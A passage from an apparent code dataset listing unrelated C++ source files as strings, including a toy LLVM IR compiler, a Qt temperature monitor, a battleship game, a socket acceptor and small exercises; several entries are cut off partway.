\"VARIABLE_ASSIGNMENT_TO_FUNCTION_CALL (\");\n  } else if (type == ParserElementType::VARIABLE_ASSIGNMENT_TO_INDEX) {\n    DEBUG(off << \"VARIABLE_ASSIGNMENT_TO_INDEX (\");\n  } else if (type == ParserElementType::VARIABLE_INDEX_ASSIGNMENT) {\n    DEBUG(off << \"VARIABLE_INDEX_ASSIGNMENT (\");\n  } else if (type == ParserElementType::VARIABLE_INCREMENT) {\n    DEBUG(off << \"VARIABLE_INCREMENT (\");\n  } else if (type == ParserElementType::VARIABLE_DECREMENT) {\n    DEBUG(off << \"VARIABLE_DECREMENT (\");\n  } else if (type == ParserElementType::IF) {\n    DEBUG(off << \"IF (\");\n  } else if (type == ParserElementType::IF_SINGLE_BOOL) {\n    DEBUG(off << \"IF_SINGLE_BOOL (\");\n  } else if (type == ParserElementType::WHILE) {\n    DEBUG(off << \"WHILE (\");\n  } else if (type == ParserElementType::WHILE_SINGLE_BOOL) {\n    DEBUG(off << \"WHILE_SINGLE_BOOL (\");\n  } else if (type == ParserElementType::RETURN) {\n    DEBUG(off << \"RETURN (\");\n  } else {\n    DEBUG(off << \"<UNKNOWN> (\");\n  }\n  for (std::string s : data) {\n    DEBUG(s << \" \");\n  }\n  DEBUG(\")\" << std::endl);\n  for (proglang::ParserElement e : children) {\n    e.printTree(off + \"  \");\n  }\n}\n\nstd::string proglang::ParserElement::buildLlvmIr(std::vector<std::string> _data, LlvmIrExtendedParserData& extData) {\n  std::string d;\n  std::vector<std::string> ed;\n  if (type == proglang::ParserElementType::FUNCTION) {\n    extData.var_decls = \"\";\n    extData.var_inits = \"\";\n    d += \"define dso_local \" + data[0] + \" @\" + data[1] + \"() \" + extData.registerAttrs(\"noinline nounwind optnone sspstrong uwtable\") + \" {\\n[var_decls][var_inits]\";\n    if (data[1] == \"main\") {\n      extData.snum_count++;\n      extData.var_decls += \"%1 = alloca i32, align 4\\n\";\n      extData.var_inits += \"store i32 0, ptr %1, align 4\\n\";\n    }\n  } else if (type == proglang::ParserElementType::EXTERNAL_FUNCTION) {\n    extData.ext_defs.push_back(\"declare \" + data[0] + \" @\" + data[1] + \"(\");\n    std::string func_def = data[0] + \" (\";\n    for (long unsigned int i = 2; i < data.size(); i++) {\n      extData.ext_defs.back() += data[i];\n      func_def += data[i];\n      if (data[i] != \"...\") {\n        extData.ext_defs.back() += \" noundef\";\n      }\n      if (i < data.size() - 1) {\n        extData.ext_defs.back() += \", \";\n        func_def += \", \";\n      }\n    }\n    extData.ext_defs.back() += \") \" + extData.registerAttrs(\"\");\n    func_def += \") @\" + data[1];\n    extData.func_signs[data[1]] = func_def;\n  } else if (type == proglang::ParserElementType::FUNCTION_CALL) {\n    if (extData.func_signs[data[0]].substr(0, 4) == \"void\") {\n      d += \"[temp0]call \" + extData.func_signs[data[0]] + \"(\";\n    } else {\n      d += \"[temp0]%[temp1] = call \" + extData.func_signs[data[0]] + \"(\";\n    }\n    std::string temp0;\n    for (long unsigned int i = 1; i < data.size(); i++) {\n      if (data[i].substr(0, 4) == \"str.\") {\n        int s;\n        d += \"ptr noundef \" + extData.registerStringConst(data[i].substr(4, data[i].size() - 1), s);\n      } else if (data[i].substr(0, 4) == \"any.\") {\n        std::string ap;\n        temp0 += extData.obtainVariableAccess(data[i].substr(4, data[i].size() - 1), _data[1], ap);\n        d += extData.var_types[data[i].substr(4, data[i].size() - 1)] + \" \" + ap;\n      } else {\n        ERROR(\"This is actually a compiler bug.\" << std::endl);\n        exit(1);\n      }\n      if (i < data.size() - 1) {\n        d += \", \";\n      }\n    }\n    if (extData.func_signs[data[0]].substr(0, 4) != \"void\") {\n      extData.snum_count++;\n      d = std::regex_replace(d, std::regex(\"\\\\[temp1]\"), std::to_string(extData.snum_count));\n    }\n    d = std::regex_replace(d, std::regex(\"\\\\[temp0]\"), temp0);\n    d += \")\\n\";\n  } else if (type == proglang::ParserElementType::VARIABLE_ASSIGNMENT_TO_FUNCTION_CALL) {\n    d += \"[temp0]%[temp1] = call \" + extData.func_signs[data[1]] + \"(\";\n    std::string temp0;\n    for (long unsigned int i = 2; i < data.size(); i++) {\n      if (da",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_starter_kit\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// driver.cpp\r\n\r\n#include \"company.h\"\r\n#include <iostream>\r\n\r\nint main() {\r\n    // Create a company with name, sales tax number, and number of employees\r\n    Company* syst = new Company(\"System Private Ltd\", \"111-121-131\", 3);\r\n\r\n    for (int i = 0; i < syst->getNumberEmployees(); i++) {\r\n        // Ask user the type of employee and add objects of manager, engineer or salesperson\r\n       string empType;\r\n       cout << \"Enter employee type (Manager, Engineer, or Salesperson): \";\r\n       cin >> empType;\r\n\r\n        string name;\r\n        int ID;\r\n        string designation;\r\n        double salary;\r\n\r\n        cout << \"Enter \" << empType << \" details:\" << std::endl;\r\n        cout << \"Name: \";\r\n        cin >> name;\r\n        cout << \"ID: \";\r\n        cin >> ID;\r\n        cout << \"Designation: \";\r\n        cin >> designation;\r\n        cout << \"Salary: \";\r\n        cin >> salary;\r\n\r\n        if (empType == \"Manager\") {\r\n            string department;\r\n            cout << \"Department: \";\r\n            cin >> department;\r\n            syst->addEmployee (new Manager(name, ID, designation, salary, department),i);\r\n          \r\n\r\n            std::cout << \"Manager added successfully!\" << endl;\r\n        }\r\n        else if (empType == \"Engineer\") {\r\n            string specialization;\r\n            cout << \"Specialization: \";\r\n            cin >> specialization;\r\n            syst->addEmployee( new Engineer(name, ID, designation, salary, specialization),i);\r\n            cout << \"Engineer added successfully!\" << endl;\r\n        }\r\n        else if (empType == \"Salesperson\") {\r\n            double salesTarget;\r\n            cout << \"Sales Target: \";\r\n            cin >> salesTarget;\r\n            syst->addEmployee(new Salesperson(name, ID, designation, salary, salesTarget),i);\r\n            cout << \"Salesperson added successfully!\" << endl;\r\n        }\r\n    }\r\n\r\n    cout << \"\\nEmployees Information:\\n\";\r\n    syst->displayEmployees();\r\n\r\n    delete syst;\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"screenlocker.hpp\"\n\n#include <QDBusConnection>\n#include <QDBusMessage>\n#include <QDebug>\n#include <QMessageBox>\n\nScreenLocker::ScreenLocker(QObject *parent)\n    : QObject{parent}\n    , m_screenLocked(false)\n    , m_connection(QDBusConnection::sessionBus())\n{\n    /* When screen gets locked or unlocked, listen for this event\n     * not to try to lock the screen again if bluetooth trusted devices go away.\n     */\n    m_connection.connect(\"org.freedesktop.ScreenSaver\",\n                         \"/ScreenSaver\",\n                         \"\",\n                         \"ActiveChanged\",\n                         this,\n                         SLOT(screenChanged(const QDBusMessage&)));\n}\n\nbool ScreenLocker::isScreenLocked()\n{\n    return m_screenLocked;\n}\n\nvoid ScreenLocker::lockScreen()\n{\n    auto message = QDBusMessage::createMethodCall(\n        \"org.freedesktop.ScreenSaver\",\n        \"/ScreenSaver\",\n        \"\",\n        \"Lock\"\n    );\n\n    if (not QDBusConnection::sessionBus().send(message)) {\n        QMessageBox::critical(nullptr,\n                              tr(\"Error\"),\n                              tr(\"Trusted devices are away, but screen couldn't be locked.\"));\n    }\n}\n\nvoid ScreenLocker::screenChanged(const QDBusMessage &message)\n{\n    m_screenLocked = message.arguments().at(0).toString() == \"true\" ? true : false;\n    emit activeChanged(m_screenLocked);\n}\n\n",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include \"adder.h\"\r\n#include \"structures.h\"\r\n#include \"initialisation.h\"\r\n#include \"asker.h\"\r\n\r\nclass Player{\r\n    public:\r\n    Player(): array(init()),tirs(init_vide()){}\r\n\r\n    void show_everything(){\r\n        system(\"cls\");\r\n        std::cout << \"Your ships : \\n\";\r\n        affiche_grille(array);\r\n        std::cout << \"\\nPlaces you shot : \\n\";\r\n        affiche_grille(tirs);\r\n    }\r\n\r\n    void play(grille o){\r\n        position rep;\r\n        do {rep = ask_case(\"Where do you want to try ? \");}while (tirs.arr[rep.pos[1]][rep.pos[0]] != 0);\r\n\r\n        if (o.arr[rep.pos[1]][rep.pos[0]] == 0){\r\n            tirs.arr[rep.pos[1]][rep.pos[0]]=-1;\r\n            std::cout << \"Oops... It seems that there is nothing here\\n\";\r\n        }\r\n        else{\r\n            tirs.arr[rep.pos[1]][rep.pos[0]] = -2;\r\n            std::cout << \"Fantastic ! You found something !\\n\";\r\n            c+=1;\r\n        }\r\n    }\r\n\r\n    struct grille get_whole(){\r\n        return array;\r\n    }\r\n\r\n    struct grille get_fire(){\r\n        return tirs;\r\n    }\r\n\r\n    void set(grille o){\r\n        array = o;\r\n    }\r\n\r\n    private:\r\n    struct grille array;\r\n    struct grille tirs;\r\n\r\n    public:\r\n    int c;\r\n};\r\n\r\n\r\nclass Ordinateur{\r\n    public:\r\n    Ordinateur(){\r\n        array = init_vide();\r\n        tirs = init_vide();\r\n        struct flotte flotte = init_flotte();\r\n        for (int i=0;i<5;i++){\r\n            array = random_add(flotte.l[i].l,array);\r\n        }\r\n    }\r\n\r\n    struct grille get(){\r\n        return array;\r\n    }\r\n\r\n    struct grille play(grille o){\r\n        position rep;\r\n        do {rep = random();}while (tirs.arr[rep.pos[1]][rep.pos[0]] != 0);\r\n\r\n        std::cout << \"Your opponent fired on \" << coord_to_case(rep.pos[0],rep.pos[1])<<'\\n';    \r\n        if (o.arr[rep.pos[1]][rep.pos[0]] == 0){\r\n            tirs.arr[rep.pos[1]][rep.pos[0]]=-1;\r\n            std::cout << \"You are lucky : your opponent didn't touch you.\\n\";\r\n            o.arr[rep.pos[1]][rep.pos[0]] =-1;\r\n        }\r\n        else{\r\n            tirs.arr[rep.pos[1]][rep.pos[0]] = -2;\r\n            std::cout << \"Ouch ! Your opponent touched one of your boats !\\n\";\r\n            o.arr[rep.pos[1]][rep.pos[0]] = -2;\r\n            c+=1;\r\n        }\r\n\r\n        return o;\r\n    }\r\n\r\n\r\n    private:\r\n    struct grille array;\r\n    struct grille tirs;\r\n\r\n    public:\r\n    int c;\r\n};\r\n\r\n\r\nclass Partie{\r\n    public:\r\n    void show(){\r\n        system(\"cls\");\r\n        p.show_everything();\r\n    }\r\n\r\n    void play(){\r\n        int go = rand()%2;\r\n        if (go == 1){\r\n            std::cout << \"You start\\n\";\r\n            std::cout << \"Press any keys to begin\";\r\n            _getch();\r\n        }\r\n        else{\r\n            std::cout << \"Your opponent starts\\n\";\r\n            std::cout << \"Press any keys to begin\";\r\n            _getch();\r\n        }\r\n\r\n        while (true){\r\n            if (go==0){\r\n                p.set(o.play(p.get_whole()));\r\n                go=1;\r\n                if (o.c == 17){\r\n                    break;\r\n                }\r\n            }\r\n            else{\r\n                p.play(o.get());\r\n                go=0;\r\n                if (p.c == 17){\r\n                    break;\r\n                }\r\n            }\r\n            std::cout << \"Press any keys to continue\";\r\n            _getch();\r\n            show();\r\n        }\r\n\r\n        if (go==0){\r\n            std::cout << \"Fantastic, you won !\";\r\n        }\r\n        else{\r\n            std::cout << \"What a sad day, you lose the game !\";\r\n        }\r\n        std::cout << \"Press any keys to continue\";\r\n        _getch();\r\n    }\r\n\r\n    private:\r\n    Ordinateur o;\r\n    Player p;\r\n};\r\n\r\n\r\n\r\nint main(){\r\n    srand(time(0));\r\n    Partie part;\r\n    part.show();\r\n    part.play();\r\n    std::cout << \"Press any keys to close\";\r\n    _getch();\r\n    return 0;\r\n}",
    "/**\n * @author JamesAresBrown\n * @version 0.1\n * @date 2024-01-21\n * @copyright Copyright (JamesAresBrown) 2024\n */\n\n#include \"Acceptor.h\"\n#include <cstring>\n\n#include \"Channel.h\"\n#include \"Socket.h\"\n#include \"util.h\"\n\nAcceptor::Acceptor(EventLoop *loop) : loop_(loop), sock_(nullptr), channel_(nullptr) {\n    sock_ = new Socket();\n//    InetAddress *addr;\n//    addr = new InetAddress(\"10.0.4.14\", 1234);\n    // \u51c6\u5907\u670d\u52a1\u5668\u5730\u5740\u7ed3\u6784\u4f53\n    struct sockaddr_in server_addr;\n    memset(&server_addr, 0, sizeof(server_addr));\n    server_addr.sin_family = AF_INET;\n    server_addr.sin_addr.s_addr = INADDR_ANY; // \u76d1\u542c\u6240\u6709\u7f51\u7edc\u63a5\u53e3\n    server_addr.sin_port = htons(80); // \u4f7f\u7528\u7aef\u53e3 1234\n\n    sock_->SetReuseadder(); // \u5173\u95ed\u540e\u7acb\u5373\u91cd\u7528\u8be5\u5730\u5740\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u5904\u4e8eTIME_WAIT\u72b6\u6001\u7684\u5957\u63a5\u5b57\u5360\u7528\u7aef\u53e3\uff0c\u4ece\u800c\u52a0\u5feb\u7aef\u53e3\u7684\u56de\u6536\u901f\u5ea6\u3002\n//    ErrorIf(sock_->Bind(addr) == -1, \"socket bind error\");\n    ErrorIf(bind(sock_->GetFd(), (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1, \"socket bind error\");\n//    bind(sock_->GetFd(), (struct sockaddr*)&server_addr, sizeof(server_addr));\n    ErrorIf(sock_->Listen() == -1, \"socket listen error\");\n//    sock_->Listen();\n    channel_ = new Channel(loop_, sock_->GetFd()); // \u8fd9\u91cc\u7ed1\u5b9a\u7684loop\u662f\u4e3breactor\n    std::function<void()> cb = [this] { AcceptConnection(); };\n    channel_->SetReadCallback(cb);\n    // \u4e3breactor\u8d1f\u8d23\u63a5\u6536\u8fde\u63a5\u6d88\u606f\uff0c\u91c7\u7528LT\u6a21\u5f0f\n    channel_->EnableRead();\n//    delete addr;\n}\n\nAcceptor::~Acceptor() {\n    delete channel_;\n    delete sock_;\n}\n\nvoid Acceptor::AcceptConnection() {\n    InetAddress* client_addr;\n    client_addr = new InetAddress();\n    Socket* client_sock;\n    int ret = sock_->Accept(client_addr);\n    if (-1 == ret) {\n        return;\n    }\n    client_sock = new Socket(ret);\n    printf(\"new client fd %d! IP: %s Port: %d\\n\", client_sock->GetFd(), client_addr->GetIp(), client_addr->GetPort());\n    client_sock->SetNonBlocking(); // \u65b0\u63a5\u53d7\u5230\u7684\u8fde\u63a5\u8bbe\u7f6e\u4e3a\u975e\u963b\u585e\u5f0f\n    new_connection_callback_(client_sock);\n    delete client_addr;\n}\n\nvoid Acceptor::SetNewConnectionCallback(std::function<void(Socket *)> const &callback) {\n  new_connection_callback_ = callback;\n}\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n\n\nMainWindow::MainWindow(QTimer*_timer,QWidget *parent)\n    : timer(_timer)\n    , QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    wowFlag=0;\n    int interval=TempSys::getInstance()->getCycle()*1000;\n    timer->setInterval(interval);\n    connect(timer, &QTimer::timeout, this, &MainWindow::tickFlush);\n    //\u8bbe\u7f6e\u8868\u683c\u683c\u5f0f\n    ui->setupUi(this);\n    QHeaderView* headerView = ui->tableWidget->verticalHeader();\n    headerView->setSectionResizeMode(QHeaderView::Stretch);\n    ui->tableWidget->setFrameShape(QFrame::NoFrame);\n    ui->tableWidget->setShowGrid(false);\n    ui->tableWidget->horizontalHeader()->setVisible(false);\n\n    QFont font;\n    font.setPointSize(14);\n    quint16 temperSymbol[]={0xe78e,0x0043,0};\n    ui->cycleDoubleSpinBox->setSuffix(QString::fromLocal8Bit(\" \u79d2/\u6b21\"));\n    ui->cycleDoubleSpinBox->setFont(font);\n    ui->lowDoubleSpinBox->setSuffix(\" \"+QString::fromUtf16(temperSymbol));\n    ui->lowDoubleSpinBox->setFont(font);\n    ui->highDoubleSpinBox->setSuffix(\" \"+QString::fromUtf16(temperSymbol));\n    ui->highDoubleSpinBox->setFont(font);\n\n    ui->alarmLabel_1->hide();\n    ui->alarmLabel_2->hide();\n    ui->highAlarmLabel->hide();\n    ui->lowAlarmLabel->hide();\n    //\u8bbe\u7f6e\u66f2\u7ebf\u56fe\u683c\u5f0f\n    axisX=new QValueAxis();\n    axisY=new QValueAxis();\n    axisX->setTitleText(QString::fromLocal8Bit(\"\u8bb0\u5f55\"));\n    axisY->setTitleText(QString::fromLocal8Bit(\"\u6e29\u5ea6/\")+QString::fromUtf16(temperSymbol));\n    axisX->setMin(0);\n    axisX->setMax(20);\n    axisY->setMin(-10.0);\n    axisY->setMax(60.0);\n    line_series=new QSplineSeries();\n    line_series->setPointsVisible(true);\n    line_series->setName(QString::fromLocal8Bit(\"\u6e29\u5ea6\u66f2\u7ebf\"));\n\n    chart=new QChart();\n    chart->addAxis(axisX,Qt::AlignBottom);\n    chart->addAxis(axisY,Qt::AlignLeft);\n    chart->addSeries(line_series);\n\n    line_series->attachAxis(axisX);\n    line_series->attachAxis(axisY);\n\n    ui->chartView->setChart(chart);\n    ui->chartView->setRenderHint(QPainter::Antialiasing);\n    ui->chartView->setMinimumHeight(350);\n    ui->chartView->setMinimumWidth(530);\n}\n\nMainWindow::~MainWindow()\n{\n    timer->stop();\n    delete timer;\n    delete ui;\n}\n\nQTimer* MainWindow::getTimer(){\n    return timer;\n}\n\nvoid MainWindow::tickFlush(){\n    TempSys::getInstance()->tickTempSys();\n    ui->tableWidget->setColumnCount(0);\n    ui->tableWidget->setColumnCount(1);\n    quint16 temperSymbol[]={0xe78e,0x0043,0};\n    QTableWidgetItem *instantTemp=new QTableWidgetItem(QString::number(TempSys::getInstance()->getInstantTemp(),10,1)+QString::fromUtf16(temperSymbol));\n    QTableWidgetItem *averageTemp=new QTableWidgetItem(QString::number(TempSys::getInstance()->getAverateTemp(),10,1)+QString::fromUtf16(temperSymbol));\n    QTableWidgetItem *highestTemp=new QTableWidgetItem(QString::number(TempSys::getInstance()->getHighestTemp(),10,1)+QString::fromUtf16(temperSymbol));\n    QTableWidgetItem *lowestTemp=new QTableWidgetItem(QString::number(TempSys::getInstance()->getLowestTemp(),10,1)+QString::fromUtf16(temperSymbol));\n    QTableWidgetItem *readingCycle=new QTableWidgetItem(QString::number(TempSys::getInstance()->getCycle(),10,1)+QString::fromLocal8Bit(\" \u79d2/\u6b21\"));\n    //\u66f4\u65b0\u8868\u683c\u4fe1\u606f\n    instantTemp->setTextAlignment(Qt::AlignVCenter);\n    averageTemp->setTextAlignment(Qt::AlignVCenter);\n    highestTemp->setTextAlignment(Qt::AlignVCenter);\n    lowestTemp->setTextAlignment(Qt::AlignVCenter);\n    readingCycle->setTextAlignment(Qt::AlignVCenter);\n\n    highestTemp->setTextColor(QColor(255,0,4));\n    lowestTemp->setTextColor(QColor(0,255,255));\n\n    ui->tableWidget->setItem(0,0,instantTemp);\n    ui->tableWidget->setItem(1,0,averageTemp);\n    ui->tableWidget->setItem(2,0,highestTemp);\n    ui->tableWidget->setItem(3,0,lowestTemp);\n    ui->tableWidget->setItem(4,0,readingCycle);\n    //\u66f4\u65b0\u66f2\u7ebf\u56fe\u5185\u5bb9\n    int count=line_series->points().size();\n    if(count>TempSys::getInstance()->getWindowSize()){\n        chart->axisX()->setMax(count);\n        chart->axisX()->setMin(count-20);\n    }\n    line_series->setPointsVisible(true);\n    line_series->append(QPointF(count,QString::number(TempSys::getInstance()->getInstantTemp(),10,1).toDouble()));\n\n    if(TempSys::getInstance()->getInstantAlarmSituation()==-1){\n        ui->highAlarmLabel->hide();\n        ui->lowAlarmLabel->show();\n    }\n    else if(TempSys::getInstance()->getInstantAlarmSituation()==1){\n        ui->highAlarmLabel->show();\n        ui->lowAlarmLabel->hide();\n    }\n    else{\n        ui->highAlarmLabel->hide();\n        ui->lowAlarmLabel->hide();\n    }\n\n}\n\nvoid MainWindow::on_cycleDoubleSpinBox_valueChanged(double arg1)\n{\n    TempSys::getInstance()->setCycle(arg1);\n    this->timer->setInterval(TempSys::getInstance()->getCycle()*1000);\n}\n\nvoid MainWindow::on_comboBox_currentIndexChanged(int index)\n{\n    TempSys::getInstance()->switchFilterAlgorithm(index);\n}\n\nvoid MainWindow::on_lowDoubleSpinBox_valueChanged(double arg1)\n{\n    bool res = TempSys::getInstance()->setLowestAlarmTemp(arg1);\n    if(res==0)\n        ui->alarmLabel_1->show",
    "#include \"stdafx.h\"\n\n//\n//      Outlook Extract objects.\n//\n\n\n#ifdef  _CONSOLE\n#include <windows.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <direct.h>\n\n#include <malloc.h>\n#include <string.h>\n#include <stdarg.h>\n#endif\n\n\n#include \"OE5ExtractDefinitions.h\"\n#include \"DisplayAndTrace.h\"\n\n#include \"FileTime.h\"\n\nstatic char *pDay [ 7 ] = { \"Sun\", \"Mon\", \"Twe\", \"Wed\", \"Thu\", \"Fri\", \"Sat\" };\n\nstatic char *pMonth [ 12 ] = {  \"Jan\", \"Feb\", \"Mar\", \"Apr\", \"May\", \"Jun\",\n                                \"Jul\", \"Aug\", \"Sep\", \"Oct\", \"Nov\", \"Dec\" };\n\nstatic  FILETIME    fileTime;\nstatic  SYSTEMTIME  sysTime;\n\n//\n///////////////////////////////////////////////////////////////////////////////\n//\n///////////////////////////////////////////////////////////////////////////////\nstatic bool TestDayOfWeek( char *pDate )\n{\n    for ( int iX = 0; iX < 7; iX++ )\n    {\n        if ( strncmp ( pDate, pDay [ iX ], strlen ( pDay [ iX ] ) ) == 0 )\n        {\n            sysTime.wDayOfWeek = iX;\n            return true;\n        }\n    }\n\n    sysTime.wDayOfWeek = -1;\n    return false;\n}\n\n//\n///////////////////////////////////////////////////////////////////////////////\n//\n///////////////////////////////////////////////////////////////////////////////\nstatic char *SkipSpace(char *pDate)\n{\n    while ( *pDate )\n    {\n        if ( *pDate != ' ' )\n        {\n            return pDate;\n        }\n        pDate++;\n    }\n\n    return pDate;\n}\n\n//\n///////////////////////////////////////////////////////////////////////////////\n//\n///////////////////////////////////////////////////////////////////////////////\nstatic char *SkipSemi(char *pDate)\n{\n    while ( *pDate )\n    {\n        if ( *pDate != ':' )\n        {\n            return pDate;\n        }\n        pDate++;\n    }\n\n    return pDate;\n}\n\n//\n///////////////////////////////////////////////////////////////////////////////\n//\n///////////////////////////////////////////////////////////////////////////////\nstatic char *SkipNonSpace(char *pDate)\n{\n    while ( *pDate )\n    {\n        if ( *pDate == ' ' )\n        {\n            return pDate;\n        }\n        pDate++;\n    }\n\n    return pDate;\n}\n\n//\n///////////////////////////////////////////////////////////////////////////////\n//\n///////////////////////////////////////////////////////////////////////////////\nstatic char *SkipNonSemi(char *pDate)\n{\n    while ( *pDate )\n    {\n        if ( *pDate == ':' )\n        {\n            return pDate;\n        }\n        pDate++;\n    }\n\n    return pDate;\n}\n\n//\n///////////////////////////////////////////////////////////////////////////////\n//\n///////////////////////////////////////////////////////////////////////////////\nstatic bool TestMonth ( char *pDate )\n{\n    for ( int iX = 0; iX < 12; iX++ )\n    {\n        if ( strncmp ( pDate, pMonth [ iX ], strlen ( pMonth [ iX ] ) ) == 0 )\n        {\n            sysTime.wMonth = iX + 1;\n            return true;\n        }\n    }\n\n    sysTime.wMonth = 0;\n\n    return false;\n}\n\n//\n///////////////////////////////////////////////////////////////////////////////\n//\n///////////////////////////////////////////////////////////////////////////////\nstatic void SetDateTime(char *pDate)\n{\n    memset ( &sysTime, 0 , sizeof ( sysTime ) );\n\n    if ( TestDayOfWeek ( pDate ) )\n    {\n        pDate = SkipNonSpace ( pDate );\n        pDate = SkipSpace ( pDate );\n    }\n\n    sysTime.wDay = atoi ( pDate );\n    pDate = SkipNonSpace ( pDate );\n    pDate = SkipSpace ( pDate );\n\n    if ( TestMonth ( pDate ) )\n    {\n        pDate = SkipNonSpace ( pDate );\n        pDate = SkipSpace ( pDate );\n    }\n\n    sysTime.wYear = atoi ( pDate );\n    pDate = SkipNonSpace ( pDate );\n    pDate = SkipSpace ( pDate );\n\n    sysTime.wHour = atoi ( pDate );\n    pDate = SkipNonSemi ( pDate );\n    pDate = SkipSemi ( pDate );\n\n    sysTime.wMinute = atoi ( pDate );\n    pDate = SkipNonSemi ( pDate );\n    pDate = SkipSemi ( pDate );\n\n    sysTime.wSecond = atoi ( pDate );\n    pDate = SkipNonSemi ( pDate );\n    pDate = SkipSemi ( pDate );\n}\n\n//\n///////////////////////////////////////////////////////////////////////////////\n//\n///////////////////////////////////////////////////////////////////////////////\nvoid ModifyFileTime ( char *szPath, char *szAscDate )\n{\n    OFSTRUCT    ofStruct;\n\n    SetDateTime ( szAscDate );\n\n    memset ( &ofStruct, 0, sizeof ( ofStruct ) );\n\n    ofStruct.cBytes = sizeof ( ofStruct );\n\n    DWORD dwDesiredAccess       = GENERIC_WRITE;\n    DWORD dwShareMode           = FILE_SHARE_READ;\n    DWORD dwCreationDisposition = OPEN_EXISTING;\n    DWORD dwFlagsAndAttributes  = FILE_ATTRIBUTE_ARCHIVE;\n    HANDLE hFile = CreateFile(\n      szPath,                   // file name\n      dwDesiredAccess,          // access mode\n      dwShareMode,              // share mode\n      NULL,                     // Security\n      dwCreationDisposition,    // how to create\n      dwFlagsAndAttributes,     // file attributes\n      NULL                      // handle to template file\n    );\n\n    if ( hFile != INVALID_HANDLE_VALUE )\n    {\n\n        BOOL ",
    "/*\r\n  ==============================================================================\r\n\r\n    This file contains the basic framework code for a JUCE plugin editor.\r\n\r\n  ==============================================================================\r\n*/\r\n\r\n#include \"PluginProcessor.h\"\r\n#include \"PluginEditor.h\"\r\n\r\n//==============================================================================\r\nSimpleEQAudioProcessorEditor::SimpleEQAudioProcessorEditor (SimpleEQAudioProcessor& p)\r\n    : AudioProcessorEditor (&p), audioProcessor (p)\r\n{\r\n    // Make sure that before the constructor has finished, you've set the\r\n    // editor's size to whatever you need it to be.\r\n    setSize (400, 300);\r\n}\r\n\r\nSimpleEQAudioProcessorEditor::~SimpleEQAudioProcessorEditor()\r\n{\r\n}\r\n\r\n//==============================================================================\r\nvoid SimpleEQAudioProcessorEditor::paint (juce::Graphics& g)\r\n{\r\n    // (Our component is opaque, so we must completely fill the background with a solid colour)\r\n    g.fillAll (getLookAndFeel().findColour (juce::ResizableWindow::backgroundColourId));\r\n\r\n    g.setColour (juce::Colours::white);\r\n    g.setFont (15.0f);\r\n    g.drawFittedText (\"Hello World!\", getLocalBounds(), juce::Justification::centred, 1);\r\n}\r\n\r\nvoid SimpleEQAudioProcessorEditor::resized()\r\n{\r\n    // This is generally where you'll want to lay out the positions of any\r\n    // subcomponents in your editor..\r\n}\r\n",
    "// countingTheShorterWord\n#include<iostream>\n#include<vector>\n#include<string>\n\nusing namespace std;\n\nvector<string> split(string str, char delimiter){\n\tint lengt = str.length();\n\tvector<string> arr;\n\t\n\tstring tempWord = \"\";\n\tfor(int i = 0; i <= lengt; i++){\n\t\tif(str[i] == delimiter){\t\t\t\n\t\t\tarr.push_back(tempWord);\n\t\t\ttempWord = \"\";\n\t\t}else if(i == (lengt-1)){\t\t\t\t\n\t\t\ttempWord += str[i];\n\t\t\tarr.push_back(tempWord);\n\t\t\ttempWord = \"\";\n\t\t}else {\n\t\t\ttempWord += str[i];\n\t\t}\n\t}\n\t\n\treturn arr;\n}\n\n\nint main (){\n\tstring txt = \"Let's travel abroad shall we\";\n\tvector<string> res = split(txt, ' ');\n\t\n\tint result = 1000;\n\tfor(string r : res){\n\t\tint res = r.length();\n\t\tif(result > res){\n\t\t\tresult = res;\n\t\t\tcout << r << endl;\n\t\t}\n\t}\n\t\n\tcout << \"min : \" << to_string(result);\n\treturn 0;\n}\n\n/*\n#include <iostream>\n#include <vector>\n#include <string>\n\nusing namespace std;\n\nvector<string> split(const string& str, char delimiter) {\n    int lengt = str.length();\n    vector<string> arr;\n    string tempWord = \"\";\n\n    for (int i = 0; i < lengt; i++) {\n        if (str[i] == delimiter) {\n            if (!tempWord.empty()) {\n                arr.push_back(tempWord);\n                tempWord = \"\";\n            }\n        } else {\n            tempWord += str[i];\n        }\n    }\n\n    // Menambahkan kata terakhir\n    if (!tempWord.empty()) {\n        arr.push_back(tempWord);\n    }\n\n    return arr;\n}\n\nint main() {\n    string txt = \"Let's travel abroad shall we\";\n    vector<string> res = split(txt, ' ');\n\n    int result = 1000;\n    for (const string& r : res) {\n        int len = r.length();\n        if (result > len) {\n            result = len;\n            // cout << r << endl;\n        }\n    }\n\n    cout << \"min : \" << result << endl;\n    return 0;\n}\n\n*/",
